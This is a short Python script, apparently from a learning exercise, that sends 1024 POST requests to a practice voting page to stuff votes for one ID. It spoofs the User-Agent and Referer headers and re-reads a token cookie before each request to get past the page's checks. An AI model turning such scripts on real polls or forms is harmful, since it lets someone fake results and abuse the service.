#!/usr/bin/python3
"""

Send multiple POST request to http://158.69.76.135/level0.php
Project is for learning purposes only and this page was created for that

"""
import requests

# Data gotten from a request made from web page

url = 'http://158.69.76.135/level2.php'
with requests.Session() as session:
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Referer': 'http://158.69.76.135/level2.php'
    }

    request = session.options(url)
    cookie = session.cookies['HoldTheDoor']
    payload = {
        'id': 904,
        'holdthedoor': 'Submit',
        'key': cookie
    }

    for petition in range(1024):
        response = session.post(url, data=payload, headers=headers)
        payload['key'] = session.cookies['HoldTheDoor']
